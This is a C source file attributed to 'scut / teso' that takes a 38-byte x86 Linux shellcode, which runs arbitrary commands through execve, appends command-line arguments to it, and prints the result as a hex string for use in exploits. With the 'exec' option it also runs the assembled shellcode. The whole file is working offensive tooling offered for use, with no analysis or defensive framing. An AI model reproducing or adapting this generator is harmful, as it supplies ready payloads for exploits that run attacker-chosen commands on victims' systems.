
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <ctype.h>
#include <string.h>


/* 38 byte x86/linux PIC arbitrary execute shellcode - scut / teso
 */
unsigned char	shellcode[] =
	"\xeb\x1f\x5f\x89\xfc\x66\xf7\xd4\x31\xc0\x8a\x07"
	"\x47\x57\xae\x75\xfd\x88\x67\xff\x48\x75\xf6\x5b"
	"\x53\x50\x5a\x89\xe1\xb0\x0b\xcd\x80\xe8\xdc\xff"
	"\xff\xff";

static int	sc_build (unsigned char *target, size_t target_len,
	unsigned char *shellcode, char **argv);

void	hexdump (unsigned char *cbegin, unsigned char *cend);


static int
sc_build (unsigned char *target, size_t target_len, unsigned char *shellcode,
	char **argv)
{
	int	i;
	size_t	tl_orig = target_len;


	if (strlen (shellcode) >= (target_len - 1))
		return (-1);

	memcpy (target, shellcode, strlen (shellcode));
	target += strlen (shellcode);
	target_len -= strlen (shellcode);

	for (i = 0 ; argv[i] != NULL ; ++i)
		;

	/* set argument count
	 */
	target[0] = (unsigned char) i;
	target++;
	target_len--;

	for ( ; i > 0 ; ) {
		i -= 1;

		if (strlen (argv[i]) >= target_len)
			return (-1);

		printf ("[%3d/%3d] adding (%2d): %s\n",
			(tl_orig - target_len), tl_orig,
			strlen (argv[i]), argv[i]);

		memcpy (target, argv[i], strlen (argv[i]));
		target += strlen (argv[i]);
		target_len -= strlen (argv[i]);

		target[0] = (unsigned char) (i + 1);
		target++;
		target_len -= 1;
	}

	return (tl_orig - target_len);
}


void
hexdump (unsigned char *cbegin, unsigned char *cend)
{
	int		i;
	unsigned char *	buf = cbegin;


	printf ("/* %d byte shellcode */\n", cend - cbegin);
	printf ("\"");

	for (i = 0 ; buf < cend; ++buf) {

		printf ("\\x%02x", *buf & 0xff);

		if (++i >= 12) {
			i = 0;
			printf ("\"\n\"");
		}
	}
	printf ("\";\n\n");
}


int
main (int argc, char *argv[])
{
	int		n;
	unsigned char	tbuf[2048];
	void		(* tbuf_f)(void) = (void *) tbuf;


	printf ("build exploit shellcode\n");
	printf ("-scut / teso.\n\n");

	if (argc < 2) {
		printf ("usage: %s [exec] commands ...\n\n",
			argv[0]);

		exit (EXIT_FAILURE);
	}

	printf ("constructing shellcode...\n\n");
	memset (tbuf, '\x00', sizeof (tbuf));
	if (strcmp (argv[1], "exec") == 0)
		n = sc_build (tbuf, sizeof (tbuf), shellcode, &argv[2]);
	else
		n = sc_build (tbuf, sizeof (tbuf), shellcode, &argv[1]);
	if (n == -1) {
		printf ("failed to build it.\n");
		exit (EXIT_FAILURE);
	}

	printf ("shellcode size: %d bytes\n\n", n);
	hexdump (tbuf, tbuf + n);

	if (strcmp (argv[1], "exec") == 0)
		tbuf_f ();

	exit (EXIT_SUCCESS);
}

